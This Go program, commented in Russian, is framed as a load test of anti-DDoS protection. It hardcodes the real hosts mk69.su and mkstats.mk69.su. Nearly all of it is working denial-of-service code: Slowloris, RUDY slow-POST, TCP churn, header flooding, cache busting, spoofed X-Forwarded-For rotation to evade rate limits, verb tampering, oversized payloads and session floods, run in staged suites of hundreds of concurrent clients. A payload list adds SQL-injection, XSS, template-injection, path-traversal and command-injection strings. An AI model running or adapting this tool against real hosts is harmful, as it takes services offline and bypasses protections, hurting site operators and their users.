package main

// ============================================================
// Цели:
//   mk69.su               — статический сайт, без CDN, один сервер
//   mkstats.mk69.su/api/v1 — API сбора статистики плагина
//
// Техники:
//   Из предыдущих версий:
//     loopAPI           — реалистичный/flood/WAF трафик на API
//     loopSite          — браузерный GET на статику mk69.su
//     loopAmplify       — /event с count=999999 (payload amplification)
//     loopSessionFlood  — /handshake с пустым токеном (session flood)
//
//   Новые:
//     loopSlowloris     — держит соединения живыми, досылая по 1 заголовку/10s
//     loopRUDY          — POST с огромным Content-Length, тело 1 байт/с
//     loopXFF           — X-Forwarded-For/X-Real-IP rotation (обход IP rate-limit)
//     loopLargePayload  — тело ~2MB на /data (стресс парсера и аллокатора)
//     loopCacheBust     — GET /style.css?cb=<random> (обход nginx cache)
//     loopChurn         — TLS connect → минимальный запрос → немедленный close
//     loopHeaderFlood   — 100+ случайных заголовков по 64 байт на запрос
//     loopVerbTamper    — HEAD/OPTIONS/PATCH/TRACE/DELETE на все эндпоинты
// ============================================================

import (
	"bytes"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	mrand "math/rand"
	"net"
	"net/http"
	"os"
	"sort"
	"sync"
	"sync/atomic"
	"time"
)

// =========================
// TARGETS
// =========================

const (
	APIBase     = "https://mkstats.mk69.su/api/v1"
	SiteBase    = "https://mk69.su"
	SiteHost    = "mk69.su:443"
	APIHost     = "mkstats.mk69.su:443"
	SiteHostSNI = "mk69.su"
	APIHostSNI  = "mkstats.mk69.su"
)

var siteAssets = []string{
	"/",
	"/pics/MKsoc64px.png",
	"/style.css",
	"/script.js",
	"/index.html",
}

// =========================
// CLI FLAGS
// =========================

var (
	flagMode       = flag.String("mode", "full", "full | ramp | constant | stress | site | amplify | session")
	flagTargetRPS  = flag.Int("rps", 300, "target RPS for constant-rate mode")
	flagDuration   = flag.Duration("duration", 30*time.Second, "duration for constant mode")
	flagMaxClients = flag.Int("clients", 600, "max clients for stress mode")
	flagThreshP99  = flag.Float64("p99", 1500, "fail if p99 latency (ms) exceeds this")
	flagThreshSucc = flag.Float64("success", 85.0, "fail if success% drops below this")
)

// =========================
// HISTOGRAM
// =========================

type Histogram struct {
	mu      sync.Mutex
	samples []float64
}

func (h *Histogram) Record(ms float64) {
	h.mu.Lock()
	h.samples = append(h.samples, ms)
	h.mu.Unlock()
}

func (h *Histogram) Pct(p float64) float64 {
	h.mu.Lock()
	s := make([]float64, len(h.samples))
	copy(s, h.samples)
	h.mu.Unlock()
	if len(s) == 0 {
		return 0
	}
	sort.Float64s(s)
	return s[int(float64(len(s)-1)*p/100.0)]
}

func (h *Histogram) Reset() {
	h.mu.Lock()
	h.samples = h.samples[:0]
	h.mu.Unlock()
}

// =========================
// ENDPOINT STATS
// =========================

type EP struct {
	name   string
	total  uint64
	ok     uint64
	r429   uint64
	r5xx   uint64
	netErr uint64
	hist   Histogram
}

func (e *EP) record(code int, latMs float64, isErr bool) {
	if isErr {
		atomic.AddUint64(&e.netErr, 1)
		return
	}
	atomic.AddUint64(&e.total, 1)
	e.hist.Record(latMs)
	switch {
	case code == 429:
		atomic.AddUint64(&e.r429, 1)
	case code >= 500:
		atomic.AddUint64(&e.r5xx, 1)
	case code < 400:
		atomic.AddUint64(&e.ok, 1)
	}
}

func (e *EP) print(elapsed float64) {
	t := atomic.LoadUint64(&e.total)
	ok := atomic.LoadUint64(&e.ok)
	ne := atomic.LoadUint64(&e.netErr)
	r4 := atomic.LoadUint64(&e.r429)
	r5 := atomic.LoadUint64(&e.r5xx)
	all := t + ne
	if all == 0 {
		return
	}
	rps := float64(all) / elapsed
	sp := 0.0
	if all > 0 {
		sp = float64(ok) / float64(all) * 100
	}
	fmt.Printf("  %-26s rps:%6.1f  ok:%5.1f%%  p50:%5.0f  p95:%5.0f  p99:%5.0f  max:%5.0f  429:%-5d 5xx:%-5d err:%-5d\n",
		e.name, rps, sp,
		e.hist.Pct(50), e.hist.Pct(95), e.hist.Pct(99), e.hist.Pct(100),
		r4, r5, ne,
	)
}

func (e *EP) reset() {
	atomic.StoreUint64(&e.total, 0)
	atomic.StoreUint64(&e.ok, 0)
	atomic.StoreUint64(&e.r429, 0)
	atomic.StoreUint64(&e.r5xx, 0)
	atomic.StoreUint64(&e.netErr, 0)
	e.hist.Reset()
}

// =========================
// ENDPOINT REGISTRY
// =========================

var (
	epHandshake   = &EP{name: "POST /handshake"}
	epEvent       = &EP{name: "POST /event"}
	epData        = &EP{name: "POST /data"}
	epSite        = &EP{name: "GET  mk69.su/*"}
	epCacheBust   = &EP{name: "GET  cachebust"}
	epXFF         = &EP{name: "POST xff-rotate"}
	epLargePayload = &EP{name: "POST large-payload"}
	epHeaderFlood = &EP{name: "POST header-flood"}
	epVerbTamper  = &EP{name: "VERB tampering"}
	epChurn       = &EP{name: "TCP churn"}
)

// Slowloris/RUDY отдельные счётчики — там нет HTTP-ответа
var (
	slowlorisHeld  int64  // текущее кол-во удерживаемых соединений
	slowlorisDied  uint64 // сколько дропнулось
	slowlorisTotal uint64 // всего открыто
	rudyHeld       int64
	rudyDied       uint64
	rudyTotal      uint64
)

var allEPs = []*EP{
	epHandshake, epEvent, epData, epSite,
	epCacheBust, epXFF, epLargePayload, epHeaderFlood, epVerbTamper, epChurn,
}

func resetAll() {
	for _, e := range allEPs {
		e.reset()
	}
	atomic.StoreInt64(&slowlorisHeld, 0)
	atomic.StoreUint64(&slowlorisDied, 0)
	atomic.StoreUint64(&slowlorisTotal, 0)
	atomic.StoreInt64(&rudyHeld, 0)
	atomic.StoreUint64(&rudyDied, 0)
	atomic.StoreUint64(&rudyTotal, 0)
}

func printAll(label string, elapsed float64) {
	fmt.Printf("\n📊  %s  (%.1fs)\n", label, elapsed)
	fmt.Printf("  %-26s %-10s %-9s %-5s %-5s %-5s %-5s %-8s %-8s %s\n",
		"endpoint", "rps", "ok%", "p50", "p95", "p99", "max", "429", "5xx", "err")
	for _, e := range allEPs {
		e.print(elapsed)
	}
	sl := atomic.LoadInt64(&slowlorisHeld)
	slt := atomic.LoadUint64(&slowlorisTotal)
	sld := atomic.LoadUint64(&slowlorisDied)
	rl := atomic.LoadInt64(&rudyHeld)
	rlt := atomic.LoadUint64(&rudyTotal)
	rld := atomic.LoadUint64(&rudyDied)
	if slt+rlt > 0 {
		fmt.Printf("  %-26s held:%-4d opened:%-6d dropped:%d\n",
			"Slowloris conns", sl, slt, sld)
		fmt.Printf("  %-26s held:%-4d opened:%-6d dropped:%d\n",
			"RUDY conns", rl, rlt, rld)
	}
}

// =========================
// CONNECTION ERROR BREAKDOWN
// =========================

var ceTimeout, ceRefused, ceReset, ceOther uint64

func trackConnErr(err error) {
	s := err.Error()
	switch {
	case strHas(s, "timeout") || strHas(s, "deadline"):
		atomic.AddUint64(&ceTimeout, 1)
	case strHas(s, "refused"):
		atomic.AddUint64(&ceRefused, 1)
	case strHas(s, "reset") || strHas(s, "EOF") || strHas(s, "broken pipe"):
		atomic.AddUint64(&ceReset, 1)
	default:
		atomic.AddUint64(&ceOther, 1)
	}
}

func printConnErrors() {
	to := atomic.LoadUint64(&ceTimeout)
	rf := atomic.LoadUint64(&ceRefused)
	rs := atomic.LoadUint64(&ceReset)
	ot := atomic.LoadUint64(&ceOther)
	if to+rf+rs+ot > 0 {
		fmt.Printf("  conn errors → timeout:%d  refused:%d  reset/EOF:%d  other:%d\n",
			to, rf, rs, ot)
	}
}

func strHas(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// =========================
// RANDOM HELPERS
// =========================

func randHex(n int) string {
	b := make([]byte, n)
	mrand.Read(b)
	return hex.EncodeToString(b)
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[mrand.Intn(len(letters))]
	}
	return string(b)
}

func randIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		mrand.Intn(223)+1, mrand.Intn(256), mrand.Intn(256), mrand.Intn(254)+1)
}

// =========================
// HTTP CLIENT
// =========================

func newHTTPClient(timeoutSec int) *http.Client {
	return &http.Client{
		Timeout: time.Duration(timeoutSec) * time.Second,
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 200,
			MaxIdleConns:        2000,
			IdleConnTimeout:     60 * time.Second,
			DisableCompression:  true,
		},
	}
}

// rawTLS открывает TLS соединение напрямую (для Slowloris и RUDY)
func rawTLS(host, sni string) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	return tls.DialWithDialer(dialer, "tcp", host, &tls.Config{
		ServerName: sni,
	})
}

// =========================
// BASE REQUESTS
// =========================

func doPost(c *http.Client, ep *EP, url string, body interface{}) {
	b, _ := json.Marshal(body)
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(b))
	req.Header.Set("Content-Type", "application/json")

	t0 := time.Now()
	resp, err := c.Do(req)
	lat := float64(time.Since(t0).Milliseconds())

	if err != nil {
		trackConnErr(err)
		ep.record(0, lat, true)
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	ep.record(resp.StatusCode, lat, false)
}

func doGet(c *http.Client, ep *EP, url string) {
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (LoadTest)")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")

	t0 := time.Now()
	resp, err := c.Do(req)
	lat := float64(time.Since(t0).Milliseconds())

	if err != nil {
		trackConnErr(err)
		ep.record(0, lat, true)
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	ep.record(resp.StatusCode, lat, false)
}

// =========================
// PAYLOAD BUILDERS
// =========================

func payloadRealistic(token string) map[string]interface{} {
	return map[string]interface{}{
		"plugin_id": "prod_plugin", "version": "1.0",
		"client_name": "real_client", "client_version": "1.2.3",
		"user_hash": randHex(16), "device_fingerprint": randHex(16),
		"install_token": token, "event": "heartbeat",
		"count": 1, "timestamp": time.Now().Unix(),
	}
}

func payloadFlood() map[string]interface{} {
	return map[string]interface{}{
		"plugin_id": randStr(32), "client_name": randStr(32),
		"user_hash": randStr(64), "device_fingerprint": randStr(64),
		"install_token": randHex(16), "event": randStr(16),
		"count": mrand.Intn(1000000), "timestamp": time.Now().Unix(),
	}
}

func payloadAmplified() map[string]interface{} {
	return map[string]interface{}{
		"plugin_id": "prod_plugin", "client_name": "real_client",
		"user_hash": randHex(16), "device_fingerprint": randHex(16),
		"install_token": randHex(16), "event": "heartbeat",
		"count": 999999, "timestamp": time.Now().Unix(),
	}
}

func payloadSessionFlood() map[string]interface{} {
	return map[string]interface{}{
		"plugin_id": "prod_plugin", "version": "1.0",
		"client_name": randStr(8), "client_version": "1.0.0",
		"user_hash": randHex(16), "device_fingerprint": randHex(16),
		"install_token": "", // пустой токен — форсирует новую сессию в БД
		"event": "init", "count": 1, "timestamp": time.Now().Unix(),
	}
}

func payloadWAF() map[string]interface{} {
	p := []string{
		"' OR 1=1 --", "<script>alert(1)</script>", "${7*7}",
		"../../../etc/passwd", "; DROP TABLE users; --",
		"{{7*7}}", "||id", "`id`", "%00", "\\x00",
	}
	return map[string]interface{}{
		"plugin_id": p[mrand.Intn(len(p))], "client_name": p[mrand.Intn(len(p))],
		"user_hash": randStr(64), "device_fingerprint": randStr(64),
		"install_token": randHex(16), "event": p[mrand.Intn(len(p))],
		"count": mrand.Intn(100), "timestamp": time.Now().Unix(),
	}
}

// payloadLarge — ~2MB JSON: нагружает парсер и heap аллокатор бэка
func payloadLarge() map[string]interface{} {
	events := make([]map[string]interface{}, 800)
	for i := range events {
		events[i] = map[string]interface{}{
			"id":   randHex(16),
			"data": randStr(1500), // ~1.5KB × 800 = ~1.2MB
			"ts":   time.Now().UnixNano(),
		}
	}
	return map[string]interface{}{
		"plugin_id":     "prod_plugin",
		"install_token": randHex(16),
		"events":        events,
		"timestamp":     time.Now().Unix(),
	}
}

// =========================
// STANDARD BEHAVIOR LOOPS
// =========================

func resolveMode(mode string) string {
	if mode != "mixed" {
		return mode
	}
	switch r := mrand.Float64(); {
	case r < 0.5:
		return "realistic"
	case r < 0.8:
		return "flood"
	default:
		return "waf"
	}
}

func loopAPI(stop *int32, mode string) {
	c := newHTTPClient(5)
	for atomic.LoadInt32(stop) == 0 {
		m := resolveMode(mode)
		var p map[string]interface{}
		switch m {
		case "realistic":
			p = payloadRealistic(randHex(16))
		case "waf":
			p = payloadWAF()
		default:
			p = payloadFlood()
		}
		doPost(c, epHandshake, APIBase+"/handshake", p)
		for i := 0; i < mrand.Intn(4)+1; i++ {
			doPost(c, epEvent, APIBase+"/event", p)
		}
		doPost(c, epData, APIBase+"/data", p)
		if m == "realistic" {
			time.Sleep(time.Duration(mrand.Intn(30)+10) * time.Millisecond)
		}
	}
}

func loopSite(stop *int32) {
	c := newHTTPClient(8)
	for atomic.LoadInt32(stop) == 0 {
		for _, path := range siteAssets {
			if atomic.LoadInt32(stop) != 0 {
				return
			}
			doGet(c, epSite, SiteBase+path)
		}
		time.Sleep(time.Duration(mrand.Intn(200)+50) * time.Millisecond)
	}
}

func loopAmplify(stop *int32) {
	c := newHTTPClient(10)
	for atomic.LoadInt32(stop) == 0 {
		doPost(c, epEvent, APIBase+"/event", payloadAmplified())
	}
}

func loopSessionFlood(stop *int32) {
	c := newHTTPClient(5)
	for atomic.LoadInt32(stop) == 0 {
		doPost(c, epHandshake, APIBase+"/handshake", payloadSessionFlood())
	}
}

// =========================
// НОВЫЕ АТАКИ
// =========================

// loopSlowloris — держит TLS-соединение живым, досылая по одному заголовку
// каждые ~10 секунд, но никогда не завершая HTTP-запрос.
// Цель: исчерпать worker-threads / connection pool nginx на mk69.su.
func loopSlowloris(stop *int32) {
	conn, err := rawTLS(SiteHost, SiteHostSNI)
	if err != nil {
		atomic.AddUint64(&slowlorisDied, 1)
		return
	}
	defer conn.Close()

	atomic.AddUint64(&slowlorisTotal, 1)
	atomic.AddInt64(&slowlorisHeld, 1)
	defer atomic.AddInt64(&slowlorisHeld, -1)

	// Начинаем GET-запрос, но не завершаем его (нет \r\n\r\n)
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n", SiteHostSNI)

	for atomic.LoadInt32(stop) == 0 {
		conn.SetDeadline(time.Now().Add(15 * time.Second))
		_, err := fmt.Fprintf(conn, "X-Slow-%s: %s\r\n", randStr(6), randStr(12))
		if err != nil {
			atomic.AddUint64(&slowlorisDied, 1)
			return
		}
		time.Sleep(9 * time.Second)
	}
}

// loopRUDY (R-U-Dead-Yet) — POST с огромным Content-Length на API,
// тело течёт по 1 байту каждую секунду.
// Цель: держать backend worker занятым минутами на /event.
func loopRUDY(stop *int32) {
	conn, err := rawTLS(APIHost, APIHostSNI)
	if err != nil {
		atomic.AddUint64(&rudyDied, 1)
		return
	}
	defer conn.Close()

	atomic.AddUint64(&rudyTotal, 1)
	atomic.AddInt64(&rudyHeld, 1)
	defer atomic.AddInt64(&rudyHeld, -1)

	const bodySize = 500000
	header := fmt.Sprintf(
		"POST /api/v1/event HTTP/1.1\r\nHost: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n\r\n",
		APIHostSNI, bodySize,
	)
	if _, err := fmt.Fprint(conn, header); err != nil {
		atomic.AddUint64(&rudyDied, 1)
		return
	}

	for i := 0; i < bodySize && atomic.LoadInt32(stop) == 0; i++ {
		conn.SetDeadline(time.Now().Add(3 * time.Second))
		if _, err := conn.Write([]byte("X")); err != nil {
			atomic.AddUint64(&rudyDied, 1)
			return
		}
		time.Sleep(time.Second)
	}
}

// loopXFF — каждый запрос несёт свежий случайный X-Forwarded-For.
// Проверяет: rate-limiter смотрит на реальный IP или доверяет заголовкам?
// Если антиDDoS блокирует по XFF — это дыра.
func loopXFF(stop *int32) {
	c := newHTTPClient(5)
	eps := []string{
		APIBase + "/handshake",
		APIBase + "/event",
		APIBase + "/data",
	}
	for atomic.LoadInt32(stop) == 0 {
		b, _ := json.Marshal(payloadFlood())
		url := eps[mrand.Intn(len(eps))]
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer(b))
		req.Header.Set("Content-Type", "application/json")
		// Максимально правдоподобная ротация IP
		fakeIP := randIP()
		req.Header.Set("X-Forwarded-For", fmt.Sprintf("%s, %s", fakeIP, randIP()))
		req.Header.Set("X-Real-IP", fakeIP)
		req.Header.Set("CF-Connecting-IP", randIP())
		req.Header.Set("True-Client-IP", randIP())
		req.Header.Set("X-Originating-IP", randIP())

		t0 := time.Now()
		resp, err := c.Do(req)
		lat := float64(time.Since(t0).Milliseconds())
		if err != nil {
			trackConnErr(err)
			epXFF.record(0, lat, true)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		epXFF.record(resp.StatusCode, lat, false)
	}
}

// loopLargePayload — ~2MB JSON на /data.
// Цель: стресс JSON-парсера, GC pressure, потенциально OOM если нет лимита.
func loopLargePayload(stop *int32) {
	c := newHTTPClient(30) // большой таймаут — тело реально большое
	for atomic.LoadInt32(stop) == 0 {
		doPost(c, epLargePayload, APIBase+"/data", payloadLarge())
	}
}

// loopCacheBust — GET на статику с уникальным query param каждый раз.
// Nginx не может отдать из кэша → идёт на диск / upstream каждый запрос.
func loopCacheBust(stop *int32) {
	c := newHTTPClient(8)
	for atomic.LoadInt32(stop) == 0 {
		for _, path := range siteAssets {
			if atomic.LoadInt32(stop) != 0 {
				return
			}
			// уникальный параметр = промах кэша гарантирован
			url := SiteBase + path + "?v=" + randHex(8) + "&t=" + randHex(4)
			doGet(c, epCacheBust, url)
		}
	}
}

// loopChurn — TLS connect → минимальный запрос → close без чтения ответа.
// Генерирует лавину TIME_WAIT сокетов на сервере, исчерпывает fd и ephemeral ports.
func loopChurn(stop *int32) {
	for atomic.LoadInt32(stop) == 0 {
		conn, err := rawTLS(SiteHost, SiteHostSNI)
		if err != nil {
			trackConnErr(err)
			epChurn.record(0, 0, true)
			continue
		}
		t0 := time.Now()
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + SiteHostSNI + "\r\n\r\n"))
		lat := float64(time.Since(t0).Milliseconds())
		conn.Close() // закрываем немедленно, не читая ответ
		epChurn.record(200, lat, false)
	}
}

// loopHeaderFlood — каждый запрос несёт 100+ случайных заголовков по 64 байт.
// Цель: переполнить large_client_header_buffers nginx, стресс WAF-парсера.
func loopHeaderFlood(stop *int32) {
	c := newHTTPClient(10)
	for atomic.LoadInt32(stop) == 0 {
		b, _ := json.Marshal(payloadRealistic(randHex(16)))
		req, _ := http.NewRequest("POST", APIBase+"/event", bytes.NewBuffer(b))
		req.Header.Set("Content-Type", "application/json")
		for i := 0; i < 120; i++ {
			req.Header.Set("X-"+randStr(12)+"-"+randStr(4), randStr(64))
		}
		t0 := time.Now()
		resp, err := c.Do(req)
		lat := float64(time.Since(t0).Milliseconds())
		if err != nil {
			trackConnErr(err)
			epHeaderFlood.record(0, lat, true)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		epHeaderFlood.record(resp.StatusCode, lat, false)
	}
}

// loopVerbTamper — нестандартные HTTP-методы на все эндпоинты.
// Часть антиDDoS решений фильтрует только POST/GET — остальное пропускает.
func loopVerbTamper(stop *int32) {
	c := newHTTPClient(5)
	verbs := []string{"HEAD", "OPTIONS", "PATCH", "TRACE", "DELETE", "PUT", "CONNECT"}
	targets := []string{
		APIBase + "/handshake",
		APIBase + "/event",
		APIBase + "/data",
		SiteBase + "/",
		SiteBase + "/style.css",
	}
	for atomic.LoadInt32(stop) == 0 {
		verb := verbs[mrand.Intn(len(verbs))]
		url := targets[mrand.Intn(len(targets))]
		req, _ := http.NewRequest(verb, url, nil)

		t0 := time.Now()
		resp, err := c.Do(req)
		lat := float64(time.Since(t0).Milliseconds())
		if err != nil {
			trackConnErr(err)
			epVerbTamper.record(0, lat, true)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		epVerbTamper.record(resp.StatusCode, lat, false)
	}
}

// =========================
// STAGE RUNNER
// =========================

type Stage struct {
	label string

	// прежние векторы
	api     int
	site    int
	amplify int
	session int

	// новые векторы
	slowloris   int
	rudy        int
	xff         int
	largePay    int
	cacheBust   int
	churn       int
	headerFlood int
	verbTamper  int

	duration time.Duration
	mode     string
}

func runStage(s Stage) {
	fmt.Printf(
		"\n🌊  %-36s  api:%d site:%d amp:%d sess:%d slow:%d rudy:%d xff:%d large:%d cache:%d churn:%d hdr:%d verb:%d  [%s]\n",
		s.label,
		s.api, s.site, s.amplify, s.session,
		s.slowloris, s.rudy, s.xff, s.largePay, s.cacheBust, s.churn, s.headerFlood, s.verbTamper,
		s.duration,
	)
	resetAll()

	var wg sync.WaitGroup
	var stop int32

	spawn := func(n int, fn func(*int32)) {
		for i := 0; i < n; i++ {
			wg.Add(1)
			go func() { defer wg.Done(); fn(&stop) }()
		}
	}

	start := time.Now()

	if s.api > 0 {
		spawn(s.api, func(st *int32) { loopAPI(st, s.mode) })
	}
	if s.site > 0 {
		spawn(s.site, func(st *int32) { loopSite(st) })
	}
	if s.amplify > 0 {
		spawn(s.amplify, func(st *int32) { loopAmplify(st) })
	}
	if s.session > 0 {
		spawn(s.session, func(st *int32) { loopSessionFlood(st) })
	}
	if s.slowloris > 0 {
		spawn(s.slowloris, func(st *int32) { loopSlowloris(st) })
	}
	if s.rudy > 0 {
		spawn(s.rudy, func(st *int32) { loopRUDY(st) })
	}
	if s.xff > 0 {
		spawn(s.xff, func(st *int32) { loopXFF(st) })
	}
	if s.largePay > 0 {
		spawn(s.largePay, func(st *int32) { loopLargePayload(st) })
	}
	if s.cacheBust > 0 {
		spawn(s.cacheBust, func(st *int32) { loopCacheBust(st) })
	}
	if s.churn > 0 {
		spawn(s.churn, func(st *int32) { loopChurn(st) })
	}
	if s.headerFlood > 0 {
		spawn(s.headerFlood, func(st *int32) { loopHeaderFlood(st) })
	}
	if s.verbTamper > 0 {
		spawn(s.verbTamper, func(st *int32) { loopVerbTamper(st) })
	}

	time.Sleep(s.duration)
	atomic.StoreInt32(&stop, 1)
	wg.Wait()

	printAll(s.label, time.Since(start).Seconds())
	printConnErrors()
}

// =========================
// CONSTANT-RATE (vegeta-style)
// =========================

func runConstantRate(rps int, dur time.Duration, mode string) {
	fmt.Printf("\n⚡  Constant-rate: %d RPS × %s | mode: %s\n", rps, dur, mode)
	resetAll()

	ticker := time.NewTicker(time.Second / time.Duration(rps))
	defer ticker.Stop()

	var wg sync.WaitGroup
	deadline := time.After(dur)
	start := time.Now()

	for {
		select {
		case <-deadline:
			wg.Wait()
			printAll(fmt.Sprintf("constant %d rps", rps), time.Since(start).Seconds())
			printConnErrors()
			return
		case <-ticker.C:
			wg.Add(1)
			go func() {
				defer wg.Done()
				c := newHTTPClient(5)
				m := resolveMode(mode)
				var p map[string]interface{}
				switch m {
				case "realistic":
					p = payloadRealistic(randHex(16))
				case "waf":
					p = payloadWAF()
				default:
					p = payloadFlood()
				}
				doPost(c, epHandshake, APIBase+"/handshake", p)
			}()
		}
	}
}

// =========================
// THRESHOLDS (k6-style)
// =========================

type Thresh struct {
	name   string
	got    float64
	limit  float64
	passed bool
}

func checkThresholds() []Thresh {
	var results []Thresh
	for _, ep := range allEPs {
		p99 := ep.hist.Pct(99)
		results = append(results, Thresh{
			name:   fmt.Sprintf("p99(%-22s) < %.0fms", ep.name, *flagThreshP99),
			got:    p99, limit: *flagThreshP99,
			passed: p99 == 0 || p99 < *flagThreshP99,
		})
	}
	var totalAll, totalOK uint64
	for _, ep := range allEPs {
		totalAll += atomic.LoadUint64(&ep.total) + atomic.LoadUint64(&ep.netErr)
		totalOK += atomic.LoadUint64(&ep.ok)
	}
	sp := 0.0
	if totalAll > 0 {
		sp = float64(totalOK) / float64(totalAll) * 100
	}
	results = append(results, Thresh{
		name:   fmt.Sprintf("success_rate > %.0f%%", *flagThreshSucc),
		got:    sp, limit: *flagThreshSucc,
		passed: sp >= *flagThreshSucc,
	})
	return results
}

func printThresholds(rs []Thresh) {
	fmt.Println("\n┌───────────────────────────── THRESHOLDS ──────────────────────────────┐")
	allOK := true
	for _, r := range rs {
		icon := "✅"
		if !r.passed {
			icon = "❌"
			allOK = false
		}
		fmt.Printf("│ %s  %-54s got: %6.1f\n", icon, r.name, r.got)
	}
	fmt.Println("└────────────────────────────────────────────────────────────────────────┘")
	if allOK {
		fmt.Println("\n✅  All thresholds passed — anti-DDoS держит удар, стоит покупать.")
	} else {
		fmt.Println("\n❌  Thresholds FAILED — найдены слабые места, разберись до покупки.")
		os.Exit(1)
	}
}

// =========================
// FULL SUITE
// =========================

func fullSuite() {
	stages := []Stage{
		// [1] Baseline — только реалистичный трафик, измеряем норму
		{label: "[1]  baseline",
			api: 50, duration: 20 * time.Second, mode: "realistic"},

		// [2] Смешанный трафик + статика сайта
		{label: "[2]  mixed api + site",
			api: 80, site: 30, duration: 20 * time.Second, mode: "mixed"},

		// [3] Payload amplification — /event count=999999
		{label: "[3]  payload amplify",
			api: 20, amplify: 60, duration: 20 * time.Second, mode: "realistic"},

		// [4] Session flood — /handshake без токена
		{label: "[4]  session flood",
			api: 20, session: 80, duration: 20 * time.Second, mode: "realistic"},

		// [5] Slowloris + RUDY — медленные соединения, исчерпывание worker-threads
		{label: "[5]  slowloris + RUDY",
			api: 30, slowloris: 200, rudy: 60, duration: 40 * time.Second, mode: "realistic"},
		// Примечание: slowloris держит соединения весь этап (40s),
		// поэтому этап длиннее — нужно дать время накопить соединения.

		// [6] X-Forwarded-For rotation — проверяем обход IP rate-limit
		{label: "[6]  XFF IP rotation",
			api: 40, xff: 120, duration: 20 * time.Second, mode: "flood"},

		// [7] Large JSON — ~2MB на /data, стресс парсера и GC
		{label: "[7]  large payload",
			api: 30, largePay: 40, duration: 20 * time.Second, mode: "realistic"},

		// [8] Cache busting — промахи кэша nginx на каждый запрос
		{label: "[8]  cache busting",
			site: 20, cacheBust: 80, duration: 20 * time.Second, mode: "realistic"},

		// [9] Rapid TCP churn — лавина TIME_WAIT сокетов
		{label: "[9]  TCP churn",
			api: 30, churn: 150, duration: 20 * time.Second, mode: "flood"},

		// [10] Header flood + Verb tampering — переполнение header buffers, нестандартные методы
		{label: "[10] header flood + verbs",
			api: 40, headerFlood: 80, verbTamper: 40, duration: 20 * time.Second, mode: "mixed"},

		// [11] Пик — все векторы одновременно
		{label: "[11] PEAK all vectors",
			api: 80, site: 20, amplify: 30, session: 30,
			xff: 50, largePay: 20, cacheBust: 30, churn: 60,
			headerFlood: 30, verbTamper: 20,
			slowloris: 100, rudy: 30,
			duration: 30 * time.Second, mode: "flood"},

		// [12] WAF проверки под нагрузкой
		{label: "[12] WAF probes",
			api: 80, site: 20, xff: 40, verbTamper: 40,
			duration: 20 * time.Second, mode: "waf"},

		// [13] Cool-down — проверяем восстановление после всего
		{label: "[13] cool-down recovery",
			api: 30, site: 10, duration: 20 * time.Second, mode: "realistic"},
	}

	for _, s := range stages {
		runStage(s)
	}
}

// =========================
// RAMP SUITE (k6-style)
// =========================

func rampSuite() {
	stages := []Stage{
		{label: "[ramp] warm-up",   api: 20, site: 5, duration: 10 * time.Second, mode: "realistic"},
		{label: "[ramp] ramp-up",   api: 80, site: 20, xff: 20, duration: 20 * time.Second, mode: "realistic"},
		{label: "[ramp] peak",      api: 150, site: 30, amplify: 20, session: 20, xff: 40, slowloris: 80,
			churn: 50, headerFlood: 30, duration: 30 * time.Second, mode: "mixed"},
		{label: "[ramp] ramp-down", api: 60, site: 10, duration: 15 * time.Second, mode: "realistic"},
		{label: "[ramp] cool-down", api: 20, site: 5, duration: 10 * time.Second, mode: "realistic"},
	}
	for _, s := range stages {
		runStage(s)
	}
}

// =========================
// STRESS SUITE
// =========================

func stressSuite(max int) {
	step := max / 5
	for n := step; n <= max; n += step {
		runStage(Stage{
			label:       fmt.Sprintf("[stress] %d clients", n),
			api:         n * 2 / 5,
			site:        n / 10,
			amplify:     n / 10,
			xff:         n / 10,
			churn:       n / 10,
			headerFlood: n / 10,
			duration:    20 * time.Second,
			mode:        "flood",
		})
	}
}

// =========================
// MAIN
// =========================

func main() {
	flag.Parse()
	mrand.Seed(time.Now().UnixNano())

	fmt.Println("🚀  Load test started")
	fmt.Printf("    API    : %s\n", APIBase)
	fmt.Printf("    Site   : %s\n", SiteBase)
	fmt.Printf("    Mode   : %s\n", *flagMode)
	fmt.Printf("    Thresh : p99 < %.0fms | success > %.0f%%\n\n", *flagThreshP99, *flagThreshSucc)

	switch *flagMode {
	case "full":
		fullSuite()
	case "ramp":
		rampSuite()
	case "constant":
		runConstantRate(*flagTargetRPS, *flagDuration, "mixed")
	case "stress":
		stressSuite(*flagMaxClients)
	default:
		fmt.Fprintf(os.Stderr, "unknown mode: %s\n", *flagMode)
		os.Exit(1)
	}

	printThresholds(checkThresholds())
}
